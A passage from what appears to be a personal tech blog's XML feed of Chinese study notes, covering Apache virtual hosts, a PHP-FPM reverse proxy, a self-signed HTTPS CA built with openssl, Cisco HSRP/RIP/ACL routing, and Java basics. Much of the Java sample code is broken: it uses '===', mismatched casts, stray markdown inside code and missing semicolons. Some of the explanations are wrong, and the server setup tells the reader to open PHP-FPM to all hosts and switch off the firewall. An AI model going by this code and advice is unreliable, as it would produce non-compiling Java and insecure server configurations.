</IFModule>

<p>ErrorDocument 404 filepath &#x2F;&#x2F;自定义错误页面</p>
<p>ServerName <a href="http://www.armandhe.com/">www.armandhe.com:80</a>  &#x2F;&#x2F;配置主机名-FQDN</p>
<h2 id="虚拟主机"><a href="#虚拟主机" class="headerlink" title="虚拟主机"></a>虚拟主机</h2><p>一台服务器上可以运行多个主机，一个中心主机，其他虚拟主机。停掉中心主机后建立虚拟主机</p>
<p>中心主机与虚拟主机可通过ip地址、端口号、http头部的hosts来区分</p>
<p>单独建立一个虚拟主机，新建一个配置文件</p>
<p>cd &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;conf.d</p>
<p>touch virtualhost.conf</p>
<p>在该文件中写入</p>
<p>&lt;VirtualHost 172.16.11.16:80&gt;</p>
<p>DocumentRoot “&#x2F;a”</p>
<p>&lt;Directory “&#x2F;a”&gt;</p>
<p>Require all granted</p>
</Directory>

</VirtualHost>

<h1 id="动态服务器工作结构"><a href="#动态服务器工作结构" class="headerlink" title="动态服务器工作结构"></a>动态服务器工作结构</h1><p>客户端的消息发送到httpd之后，如果是请求静态资源，httpd直接将数据发送到客果请求的是动态的资源，则请求被传送到php服务器，php服务器处理完之后再将结果发送到httpd，由httpd发送给客户端。</p>
<p><code>单体架构</code></p>
<p>前端和后端写在一起</p>
<p><code>前后分离</code></p>
<p>php默认监听在9000端口</p>
<p>php与httpd的结合方式分为模块化，与独立进程两种方式</p>
<p>模块化，php作为httpd的一个模块嵌入到httpd中</p>
<p>独立进程，php独立成为一个进程。</p>
<p>独立进程php安装：yum install php-fpm</p>
<p><strong>独立进程php服务器架构</strong></p>
<p>cd &#x2F;etc&#x2F;php-fpm.d</p>
<p>vim <a href="http://www.conf/">www.conf</a></p>
<p>将允许访问的客户端ip地址 listen.allowed_clients修改为你的apache客户端ip地址</p>
<p>在apache的配置文件中写入</p>
<p>ProxyPassMatch  “&#x2F;(.*.php$) “ “fcgi:&#x2F;&#x2F;ipaddr:port-9000&#x2F;phpfile_path&#x2F;$1” &#x2F;&#x2F;反向代理</p>
<p>删除php模块 保留配置文件 注释掉最后两行</p>
<h1 id="https实现"><a href="#https实现" class="headerlink" title="https实现"></a>https实现</h1><h2 id="证书签发流程"><a href="#证书签发流程" class="headerlink" title="证书签发流程"></a>证书签发流程</h2><p>yum install openssl 			<br>第一步 创建私有CA<br>1：(umask 066;openssl genrsa -out &#x2F;etc&#x2F;pki&#x2F;CA&#x2F;private&#x2F;cakey.pem 2048)<br>生成CA密钥<br>2： openssl req -new -x509 -key &#x2F;etc&#x2F;pki&#x2F;CA&#x2F;private&#x2F;cacd key.pem -days 7300 -out &#x2F;etc&#x2F;pki&#x2F;CA&#x2F;cacert.pem<br>自签CA证书<br>第二步 申请证书<br>1：  (umask 066;openssl genrsa -out &#x2F;etc&#x2F;httpd&#x2F;ssl&#x2F;httpd.key 2048)<br>生成web服务器私钥<br>2： openssl req -new -key &#x2F;etc&#x2F;httpd&#x2F;ssl&#x2F;httpd.key -days 365 -out &#x2F;etc&#x2F;httpd&#x2F;ssl&#x2F;httpd.csr<br>创建证书申请<br>第三步 签署证书<br>1：	touch &#x2F;etc&#x2F;pki&#x2F;CA&#x2F;index.txt ;echo 01 &gt;&#x2F;etc&#x2F;pki&#x2F;CA&#x2F;serial<br>创建证书数据库;证书颁发列表<br>2： openssl ca -in &#x2F;etc&#x2F;httpd&#x2F;ssl&#x2F;httpd.csr -out &#x2F;etc&#x2F;pki&#x2F;CA&#x2F;certs&#x2F;httpd.crt -days 365<br>签发证书<br>使用证书实现https<br>1 :安装mod_ssl<br>2 : &#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;ssl.conf<br>1: SSLCertificateFile &#x2F;etc&#x2F;httpd&#x2F;ssl&#x2F;httpd.crt 指定证书的位置<br>2：SSLCertificateKeyFile &#x2F;etc&#x2F;httpd&#x2F;ssl&#x2F;httpd.key 指定私钥的位置</p>
<h2 id="后续步骤"><a href="#后续步骤" class="headerlink" title="后续步骤"></a>后续步骤</h2><p>sz &#x2F;etc&#x2F;pki&#x2F;CA&#x2F;cacert.pem &#x2F;&#x2F;将证书拷贝到桌面,添加到受信任的根证书签发机构</p>
<p><code>双击证书安装</code></p>
<p>win+r 输入MMC 添加一个管理节点 选择证书 查看安装的证书</p>
<p>在&#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;ssl.conf 在虚拟主机里面添加证书的路径与私钥的路径</p>
<p>SSLCertificateFile &#x2F;etc&#x2F;httpd&#x2F;ssl&#x2F;httpd.crt &#x2F;&#x2F;证书路径</p>
<p>SSLCertificateKeyFile &#x2F;etc&#x2F;httpd&#x2F;ssl&#x2F;httpd.key &#x2F;&#x2F;私钥路径</p>
<p>添加虚拟主机的配置到ssl.conf 添加以下内容</p>
<p>ServerName <a href="http://www.test.com:443/">www.test.com:443</a><br> DocumentRoot “&#x2F;test”<br>&lt;Directory “&#x2F;a”&gt;<br>     require all granted<br> </Directory><br>ProxyPassMatch &#x2F;(.*.php$) “fcgi:&#x2F;&#x2F;192.168.0.107:9000&#x2F;phptest&#x2F;$1”  &#x2F;&#x2F;反向代理到php服务器</p>
<p>apache服务器上应该卸载php模块，但保留php.conf配置文件并注释掉其最后两行内容</p>
<p>php服务器上应该修改以下内容</p>
<p>listen &#x3D; 9000 &#x2F;&#x2F;监听所有的ip地址的9000端口</p>
<p>listen.allowed_clients &#x3D; 127.0.0.1 &#x2F;&#x2F;注释掉这一行，表示允许所有主机访问该站点</p>
<p>&#x2F;&#x2F;<code>注意关闭防火墙</code> 访问时记得修改hosts文件</p>
<h1 id="NGINX"><a href="#NGINX" class="headerlink" title="NGINX"></a>NGINX</h1>]]></content>
      <categories>
        <category>安全技术</category>
        <category>协议规范</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
        <tag>HTTPS</tag>
      </tags>
  </entry>
  <entry>
    <title>HRSP-浮动路由-RIP-ACL-IPsec</title>
    <url>/archives/db738475.html</url>
    <content><![CDATA[<h1 id="配置HSRP"><a href="#配置HSRP" class="headerlink" title="配置HSRP"></a>配置HSRP</h1><p>R1(config)#int f0&#x2F;0 &#x2F;&#x2F;内网端口<br>R1(config-if)#standby 1 ip 虚拟ip地址<br>R1(config-if)#standby 1 priority 100<br>R1(config-if)# standby 1 preempt  &#x2F;&#x2F;配置占先权<br>R1(config-if)# standby 1 times 2 8 &#x2F;&#x2F;hello间隔与保持时间 同一hsrp组的时间应一致<br>R1(config-if)# standby 1 track f0&#x2F;1 100 &#x2F;&#x2F;配置端口跟踪<br>R1(config)# spanning-tree vlan 10 root primary<br>R1(config)# spanning-tree vlan 20 root secondary &#x2F;&#x2F;配置生成树实现负载均衡vlan 20走备份路由<br>R2(config)#int f0&#x2F;0 &#x2F;&#x2F;内网端口<br>R2(config-if)#standby 1 ip 虚拟ip地址<br>R2(config-if)#standby 1 priority 195 &#x2F;&#x2F;0-255<br>R2(config-if)# standby 1 preempt &#x2F;&#x2F;设置活跃路由器得占先权，由于从较低优先级别得路由器中取回转发全，回复活跃路由器的角色<br>R2(config-if)# standby 1 times 2 8 &#x2F;&#x2F;hello间隔与保持时间<br>R2(config-if)# standby 1 track f0&#x2F;1 100 &#x2F;&#x2F;配置端口跟踪<br>R2(config)# spanning-tree vlan 10 root primary<br>R2(config)# spanning-tree vlan 20 root secondary &#x2F;&#x2F;配置生成树实现负载均衡vlan 20走备份路由<br>优先级高的路由其作为主路由，优先级低的路由作为备份路由，当主路由发生故障的时候，备份路由由监听状态切换到活跃状态。当优先级相同时，比较端口ip,ip较大的作为活跃路由，如果优先级低的路由<br>已经成为了活跃路由，那么优先级高的路由将作为监听路由，直到活跃路由发生故障。值愈大优先级越高</p>
<h2 id="hsrp协议组中由6种状态："><a href="#hsrp协议组中由6种状态：" class="headerlink" title="hsrp协议组中由6种状态："></a>hsrp协议组中由6种状态：</h2><p>初始状态：路由器刚启动时，或者配置发生改变时<br>学习状态：路由其等待来自活跃路由器的消息，此时路由器还没有收到来自活跃里尤其的hello消息，也没有学习到虚拟路由器的ip地址<br>监听状态：路由其学习了虚拟的ip地址，但他既不是活跃路由器也不是监听路由器，此时负责监听来自活跃路由器与备份路由器的hello包<br>发言状态：路由器周期性发送hello消息，并参与活跃路由器或者备份路由器的京选<br>备份状态：处于该状态的路由器时下一个活跃路由器的候选设备，其周期性得发送hello包<br>活跃状态：负责转发虚拟路由器得数据包，并周期性得发送hello消息。<br>hello间隔：3s<br>保持间隔10s<br>通产保持间隔要在hello间隔得3倍<br>使用udp协议</p>
<h2 id="vrrp-虚拟路由冗余协议"><a href="#vrrp-虚拟路由冗余协议" class="headerlink" title="vrrp 虚拟路由冗余协议"></a>vrrp 虚拟路由冗余协议</h2><p>只有初始状态、活跃状态、备份状态三种状态<br>允许vrrp组得设备间建立认证机制</p>
<h1 id="rip-距离矢量算法，根据跳数来选择路由"><a href="#rip-距离矢量算法，根据跳数来选择路由" class="headerlink" title="rip-距离矢量算法，根据跳数来选择路由"></a>rip-距离矢量算法，根据跳数来选择路由</h1><p>属于内部网关协议igp-有一系列协议族  还有一种时外部网关协议egp-只有一种协议<br>内部网关协议是往往是工作在一个组织实体里面的的路由器之间交换路由信息的协议，组织实体是指像学校、医院之类的实体<br>最大路由跳数为15跳，大于该值的路由被认为不可达</p>
<p>当更新周期到达时，其向相邻的路由器发送学习到的路由。</p>
<p>通过更行-update 与请求-requests两种分组来传输信息，更新周期为30s，如果不进行指定默认通过广播的形式更新信息。更新信息包括路由表与跳数两个部分。其并不是绝对根据跳数来选择路由的，同时也会参考网络的带宽。因为rip协议通过相邻路由器来更新路由表所以多网络全局的状况不清除，从而导致了一个慢收敛与不一致的问题。当三个火更多路由器构成环路是路由环路的问题仍会发生，这是需要用到触发更新法</p>
<p>RIP的水平分割</p>
<p>既路由器不向路径到来的方向回传此路径。通过将这些路由的跳数设置为16来实现该功能，能及时的解决路由环路的问题</p>
<p>RIP的保持定时器法</p>
<p>保持定时器可以防止路由器在路径从路由器从路由表中删除一定时间内（通常为180秒）接受新的路由信息。目的是为了保证每个路由器都收到路由不可达的信息，从而有效得避免了路由环路得产生。</p>
<p>RIP的触发更新法</p>
<p>当某个路径的跳数改变了路由器立即发生更新信息，不管路由器是否到达常规信息更新时间都发出更新信息。能够有效得加快路由的收敛时间</p>
<p>收敛机制</p>
<p><img src="/archives/db738475/QQ20210329085323.png"></p>
<p>当主机与其直连路由器的链路发生中断时，其立刻向于其相邻的两个路由器发送路由更新信息，如果此时发送到右下路由器的信息发生堵塞延迟，则右上方的路由器先得到更新信息，将旧的到达主机的路由信息丢弃，右下方路由器因为没有收到来自左上路由器的更新信息，继续向右上路由器发送旧的路由信息，右上方路由器收到后又添加一条到达主机的路由。如此循环形成了路由环路。<br>使用udp协议的520端口</p>
<p>RIP帧格式</p>
<p><a href="RIP%E5%B8%A7%E6%A0%BC%E5%BC%8F%202019e93eb947495cbb98e4df2efa90c1.csv">RIP帧格式</a></p>
<p>(config)#router rip<br>(config)#acc 1 deny any<br>(config-router)# network 接口网段<br>(config-router)# network 接口网段<br>(config-router)# passive-interface f0&#x2F;1 &#x2F;&#x2F;配置被动接口，只收不发<br>(config-router)# discribute-list 1 in f0&#x2F;1 &#x2F;&#x2F;配置路由过滤<br>(config-router)# distance 50 &#x2F;&#x2F;配置管理距离值，该值越小路由信息越可靠<br>(config-router)# neigbor 192l.168.1.24 &#x2F;&#x2F;配置邻居路由，以单播的形式发送路由信息</p>
<h1 id="配置浮动路由"><a href="#配置浮动路由" class="headerlink" title="配置浮动路由"></a>配置浮动路由</h1><p>ip route 网段 掩码 下一跳地址|端口号 70<br>ip route 网段 掩码 下一跳地址|端口号 100 &#x2F;&#x2F;最后一个参数位管理距离，其值越大表示优先级越低</p>
<h1 id="ACL"><a href="#ACL" class="headerlink" title="ACL"></a>ACL</h1><p>配置acl首先要配置内外网端口，配置过滤规则，将规则应用到端口。最后有一条默认拒绝所有。deny any</p>
<p>ACL包括标准acl 与扩展acl</p>
<p>标准acl是机与源ip地址进行过滤的 工作在三成 表号1-99</p>
<p>扩展acl可以通过端口号、协议等进行匹配过滤 国祚在三层与四层 表号 100-199</p>
<p>一个接口的一个方向只能有一张acl表，数据包一旦被某个rule匹配，就不再向下进行匹配。</p>
]]></content>
      <categories>
        <category>安全技术</category>
        <category>协议规范</category>
      </categories>
      <tags>
        <tag>HRSP</tag>
        <tag>RIP</tag>
        <tag>ACL</tag>
        <tag>IPSec</tag>
      </tags>
  </entry>
  <entry>
    <title>Java语法</title>
    <url>/archives/3377d36c.html</url>
    <content><![CDATA[<h1 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		System.out.print(<span class="string">&quot;armandhe&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="comment">//类名与文件名必须相同，必须有main方法</span></span><br></pre></td></tr></table></figure>

<h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><h2 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String st=<span class="string">&quot;armandhe&quot;</span>; <span class="comment">//必须使用双引号，定义字符串，不是基本数据类型，而是一个类</span></span><br><span class="line"><span class="type">byte</span> by=<span class="number">1</span>;</span><br><span class="line"><span class="type">short</span> sh=<span class="number">127</span>;</span><br><span class="line"><span class="type">int</span> in=<span class="number">65535</span>;</span><br><span class="line"><span class="type">long</span> lo=<span class="number">2111111L</span>;</span><br><span class="line"><span class="type">char</span> ch=<span class="string">&#x27;a&#x27;</span>; <span class="comment">//必须使用单引号</span></span><br><span class="line"><span class="type">float</span> fl=<span class="number">0.4f</span>;</span><br><span class="line"><span class="type">double</span> dou=<span class="number">45.35</span>;</span><br><span class="line"><span class="type">boolean</span> bo=<span class="literal">true</span>;</span><br><span class="line">str1=<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;armanghe&quot;</span>); <span class="comment">//str的类型是一个对象</span></span><br><span class="line">str1=<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;armanghe&quot;</span>); </span><br><span class="line">str1 === str2 <span class="comment">//false</span></span><br><span class="line">String str3=<span class="string">&quot;armandhe&quot;</span>;</span><br><span class="line">String str4=<span class="string">&quot;armandhe&quot;</span></span><br><span class="line">str3===str4 <span class="comment">//true</span></span><br></pre></td></tr></table></figure>

<h2 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h2><p>只能转换能转换的类型</p>
<h3 id="转换优先级"><a href="#转换优先级" class="headerlink" title="转换优先级"></a>转换优先级</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//由低到高</span></span><br><span class="line"><span class="type">byte</span> <span class="type">short</span> <span class="type">char</span> --&gt; <span class="type">int</span> --&gt; <span class="type">long</span> --&gt; <span class="type">float</span> --&gt; <span class="type">double</span></span><br></pre></td></tr></table></figure>

<p><code>低到高会发生自动类型转换，高到低需要进行强制转换</code> </p>
<h3 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> in=<span class="number">43</span>;</span><br><span class="line"><span class="type">byte</span> by=(<span class="type">int</span>)in; <span class="comment">//强制转换为byte型</span></span><br><span class="line"><span class="type">int</span> in1=<span class="number">2343444</span>;</span><br><span class="line"><span class="type">int</span> in2=<span class="number">22222222</span>;</span><br><span class="line"><span class="type">long</span> in3=in1*(<span class="type">long</span>)in2; <span class="comment">//在进行数值运算的时候一定要注意数值类型的范围，否则可能导致溢出，此方法在运算前将int转换为long类型，避免了溢出问题。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><p>值可以变化的量。变量是内存中的一段空间，不存储值，只存储值得地址。java是强类型得语言，每个变量都必须指定类型，变量声明或者定义后必须以分号结尾。</p>
<h2 id="变量作用域"><a href="#变量作用域" class="headerlink" title="变量作用域"></a>变量作用域</h2><h3 id="类变量"><a href="#类变量" class="headerlink" title="类变量"></a>类变量</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span>&#123;</span><br><span class="line">		<span class="keyword">static</span> <span class="type">int</span> i;</span><br><span class="line">		<span class="keyword">static</span> <span class="type">int</span> j=<span class="number">10</span>; <span class="comment">//类变量</span></span><br><span class="line">		<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		System.out.print(i);</span><br><span class="line">		System.out.print(j)l</span><br><span class="line">&#125;</span><br><span class="line">		<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">			<span class="comment">//方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="实例变量"><a href="#实例变量" class="headerlink" title="实例变量"></a>实例变量</h3><p>定义在类里面的变量，必须通过类引用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span>&#123;</span><br><span class="line">		<span class="type">int</span> i;</span><br><span class="line">		<span class="type">int</span> j=<span class="number">10</span>; <span class="comment">//实例变量</span></span><br><span class="line">		<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">			<span class="type">Hello</span> <span class="variable">hel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hello</span>;</span><br><span class="line">			System.out.print(hel.i); <span class="comment">//j==0 //未被初始化的变量会输出其初始值，基本数据类型基本为0，其他均为null</span></span><br><span class="line">			System.out.print(hel.j); <span class="comment">//j==10</span></span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line">		<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">			<span class="comment">//类方法</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h3><p>定义在方法中的变量</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">			<span class="type">Hello</span> <span class="variable">hel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hello</span>;</span><br><span class="line">			System.out.print(hel.i); <span class="comment">//j==0 //未被初始化的变量会输出其初始值，基本数据类型基本为0，其他均为null</span></span><br><span class="line">			System.out.print(hel.j); <span class="comment">//j==10</span></span><br><span class="line">			test.i	</span><br><span class="line">&#125;</span><br><span class="line">		<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">			<span class="comment">//类方法</span></span><br><span class="line">			<span class="type">int</span> i; <span class="comment">//局部变量</span></span><br><span class="line">			System.out.print(i);</span><br><span class="line">			</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h1><p>值固定的量</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span>&#123;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">final</span> <span class="type">double</span> PI=<span class="number">3.1415926</span>; <span class="comment">//惯例变量名大写，final是修饰符，其所处位置是任意的。</span></span><br><span class="line">		<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">			System.out.print(PI)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">+ - * / % ++ -- <span class="comment">//算数运算符</span></span><br><span class="line">= <span class="comment">//赋值运算符</span></span><br><span class="line">&lt; &gt; == &lt;= &gt;= != <span class="comment">//关系运算符</span></span><br><span class="line">&amp;&amp; || ! <span class="comment">//逻辑运算符</span></span><br><span class="line">&amp; | ^ ~ &gt;&gt; &lt;&lt; &gt;&gt;&gt; <span class="comment">//位运算符</span></span><br><span class="line">? : <span class="comment">//条件运算符，三目运算符</span></span><br><span class="line">+= -+ *= /= <span class="comment">//扩展赋值运算符</span></span><br></pre></td></tr></table></figure>

<p>算数运算时，若运算数种不含有long类型，那么结果类型必是int类型，如果long类型存在，那么结果必为long。</p>
<h1 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h1><h2 id="Scanner对象"><a href="#Scanner对象" class="headerlink" title="Scanner对象"></a>Scanner对象</h2><h3 id="next方式"><a href="#next方式" class="headerlink" title="next方式"></a>next方式</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.scanner;</span><br><span class="line"><span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"><span class="keyword">if</span> (s.hasNext())&#123; <span class="comment">//判断用户还有没有输入,按下回车后输入结束</span></span><br><span class="line">	<span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> s.next(); <span class="comment">//获取用户的输入</span></span><br><span class="line">	System.out.println(str); <span class="comment">//打印用户输入</span></span><br><span class="line">&#125;</span><br><span class="line">s.close(); <span class="comment">//关闭扫描器对象，方式io流的都需要手动关闭，否则将会占用大量的资源。</span></span><br><span class="line"><span class="comment">//输入hello world </span></span><br><span class="line"><span class="comment">//输出hello</span></span><br><span class="line"><span class="comment">//即不能输出带有空白字符的字符串，以空白字符为结束符，对于遇到有效字符前的空白，将会被忽略</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="nextline方式"><a href="#nextline方式" class="headerlink" title="nextline方式"></a>nextline方式</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.scanner;</span><br><span class="line"><span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"><span class="keyword">if</span> (s.hasNextLine())&#123; <span class="comment">//判断用户还有没有输入,按下回车后输入结束</span></span><br><span class="line">	<span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> s.nextline(); <span class="comment">//获取用户的输入</span></span><br><span class="line">	System.out.println(str); <span class="comment">//打印用户输入</span></span><br><span class="line">&#125;</span><br><span class="line">s.close(); <span class="comment">//关闭扫描器对象，方式io流的都需要手动关闭，否则将会占用大量的资源。</span></span><br><span class="line"><span class="comment">//以回车作为结束符，可以带有空白字符，可以不需要中间的判断语句。</span></span><br></pre></td></tr></table></figure>

<h3 id="其他用法"><a href="#其他用法" class="headerlink" title="其他用法"></a>其他用法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.scanner;</span><br><span class="line"><span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">System.out.println(<span class="string">&quot;请输入整数：&quot;</span>) </span><br><span class="line"><span class="keyword">if</span> (s.hasNextInt())&#123; <span class="comment">//hasNextInt hasNextFloat  hasNextDouble hasNextSting</span></span><br><span class="line">	i=s.**nextInt()**;</span><br><span class="line">	System.out.println(<span class="string">&quot;整数数据：&quot;</span> + i);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	System.out.println(<span class="string">&quot;输入的不是整数&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">s.close(); </span><br></pre></td></tr></table></figure>

<h2 id="例：求和"><a href="#例：求和" class="headerlink" title="例：求和"></a>例：求和</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.scanner;</span><br><span class="line"><span class="type">double</span> sum;</span><br><span class="line"><span class="type">int</span> m=<span class="number">1</span>;</span><br><span class="line"><span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"><span class="keyword">while</span> (s.hasNextDouble())&#123;</span><br><span class="line">	<span class="type">double</span> <span class="variable">x</span> <span class="operator">=</span> s.nextDouble();</span><br><span class="line">	x.equals(<span class="string">&quot;hello&quot;</span>) <span class="comment">//判断字符串是否相等，少使用==去判断字符串是否相等</span></span><br><span class="line">	System.out.println(<span class="string">&quot;你输入了第&quot;</span>+m+<span class="string">&quot;个数据&quot;</span>);</span><br><span class="line">	sum += x;</span><br><span class="line">	m += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;这些数字的总和为：&quot;</span>+sum+<span class="string">&quot;;&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;这些数字的平均值为：&quot;</span>+sum/m+<span class="string">&quot;;&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="顺序结构"><a href="#顺序结构" class="headerlink" title="顺序结构"></a>顺序结构</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//从上到下一次执行</span></span><br></pre></td></tr></table></figure>

<h2 id="选择结构"><a href="#选择结构" class="headerlink" title="选择结构"></a>选择结构</h2><h3 id="单选择结构与普通多选择结构"><a href="#单选择结构与普通多选择结构" class="headerlink" title="单选择结构与普通多选择结构"></a>单选择结构与普通多选择结构</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (condition)&#123;</span><br><span class="line">	<span class="comment">//语句</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (condition)&#123;</span><br><span class="line">	<span class="comment">//语句</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="comment">//语句</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="switch多选择结构"><a href="#switch多选择结构" class="headerlink" title="switch多选择结构"></a>switch多选择结构</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span>(expression)&#123;</span><br><span class="line">	<span class="keyword">case</span> value:</span><br><span class="line">		<span class="comment">//语句</span></span><br><span class="line">	<span class="keyword">case</span> value:</span><br><span class="line">		<span class="comment">//语句</span></span><br><span class="line">			.</span><br><span class="line">			.</span><br><span class="line">			.</span><br><span class="line">	<span class="keyword">default</span>: <span class="comment">//可选</span></span><br><span class="line">		<span class="comment">//语句</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//value的值可一世数字与字符串(java SE 7之后支持)，不过字符串只能是**字面量**或者**常量**不能为变量</span></span><br><span class="line"><span class="comment">//如果没有设置defaule选项，如果输入未知的数据，则会发生case穿透，将输出每一种情况的计算结果</span></span><br><span class="line"><span class="comment">//为了避免case穿透，需要加上break；如果没有break，那么将在匹配到第一项后，继续输出后面的case语句中的计算结果，直到遇到一个break或者结束</span></span><br><span class="line"><span class="keyword">switch</span>(expression)&#123;</span><br><span class="line">	<span class="keyword">case</span> value:</span><br><span class="line">		<span class="comment">//语句</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> value:</span><br><span class="line">		<span class="comment">//语句</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">			.</span><br><span class="line">			.</span><br><span class="line">			.</span><br><span class="line">	<span class="keyword">default</span>: <span class="comment">//可选</span></span><br><span class="line">		<span class="comment">//语句</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h2><h3 id="while"><a href="#while" class="headerlink" title="while"></a>while</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (condition)&#123;</span><br><span class="line">	<span class="comment">//语句</span></span><br><span class="line">	<span class="comment">//break 跳出整个循环，退出循环</span></span><br><span class="line">	<span class="comment">//continue 跳出当前循环，进入下一轮循环</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="do-while"><a href="#do-while" class="headerlink" title="do while"></a>do while</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">	<span class="comment">//语句</span></span><br><span class="line">&#125;<span class="keyword">while</span>(condition);</span><br></pre></td></tr></table></figure>

